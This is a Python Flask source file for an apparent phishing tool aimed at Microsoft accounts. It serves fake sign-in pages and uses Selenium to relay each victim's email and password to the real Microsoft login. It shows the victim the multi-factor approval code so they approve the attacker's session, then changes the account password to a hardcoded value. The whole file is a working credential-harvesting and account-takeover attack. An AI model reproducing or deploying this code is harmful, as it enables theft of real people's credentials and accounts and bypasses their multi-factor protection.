from flask import render_template, redirect, url_for, session
from app import app
from app.forms import IdForm, PasswordForm

from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

import os

NEW_PASSWORD = "aaaaaaaa"

WEB_DRIVER_NAME = "geckodriver.exe"
CURRENT_WORKING_DIRECTORY = os.getcwd()
WEB_DRIVER_PATH = CURRENT_WORKING_DIRECTORY + "\\app\\" + WEB_DRIVER_NAME

WEB_DRIVER_SERVICE = Service(executable_path = WEB_DRIVER_PATH)
DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE)

DRIVER.get("https://myapps.microsoft.com")

password_changed = False

def Change_Password():
    global password_changed

    DRIVER.get("https://mysignins.microsoft.com/security-info/password/change")
    NEW_PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
    CONFIRM_PASSWORD_FIELD = DRIVER.find_element(By.NAME, "newPasswordConfirm")

    NEW_PASSWORD_FIELD.send_keys(NEW_PASSWORD)
    CONFIRM_PASSWORD_FIELD.send_keys(NEW_PASSWORD)

    SUBMIT_BUTTON = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
    SUBMIT_BUTTON.click()

    password_changed = True

def Get_Authentication_Code():
    try:
        AUTHENTICATION_CODE = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        print("\nCode: " + AUTHENTICATION_CODE.text)
        return AUTHENTICATION_CODE.text

    except:
        try:
            RESEND_REQUEST = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
            RESEND_REQUEST.click()
            return Get_Authentication_Code()

        except:
            return False

def Fill_Password(password):
    PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "passwd")))

    PASSWORD_FIELD.send_keys(password)
    PASSWORD_FIELD.send_keys(Keys.RETURN)

    try:
        PASSWORD_ERROR = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "passwordError")))
        print("\n" + PASSWORD_ERROR.text)
        return False

    except:
        return True

def Fill_Email(email):
    EMAIL_FIELD = WebDriverWait(DRIVER, 60).until(EC.visibility_of_element_located((By.NAME, "loginfmt")))

    EMAIL_FIELD.send_keys(email)
    EMAIL_FIELD.send_keys(Keys.RETURN)

    try:
        USERNAME_ERROR = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "usernameError")))
        print("\n" + USERNAME_ERROR.text)
        EMAIL_FIELD.clear()
        return False

    except:
        return True

@app.route("/")
def index():
    if "identifier" not in session or "password" not in session or not password_changed:
        return redirect(url_for("login"))

    return render_template("index.html", title="Fake Apps", header="Fake dashboard", identifier=session["identifier"])

@app.route("/login", methods=["GET", "POST"])
def login():
    id_form = IdForm()
    password_form = PasswordForm()

    if "identifier" in session and "password" in session:
        authentication_code = Get_Authentication_Code()
        if authentication_code:
            return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)

        elif not password_changed:
            Change_Password()

        try:
            WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.NAME, "Wait for some time before closing application")))

        except:
            DRIVER.quit()

        return redirect(url_for("index"))

    elif "identifier" not in session and id_form.validate_on_submit():
        if Fill_Email(id_form.identifier.data):
            session["identifier"] = id_form.identifier.data
            return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)

    elif "identifier" in session and password_form.validate_on_submit():
        if Fill_Password(password_form.password.data):
            session["password"] = password_form.password.data

            authentication_code = Get_Authentication_Code()
            if authentication_code:
                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)

        return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", password_form=password_form)

    return render_template("login.html", title="Fake sign in", header="Fake sign in", id_form=id_form)
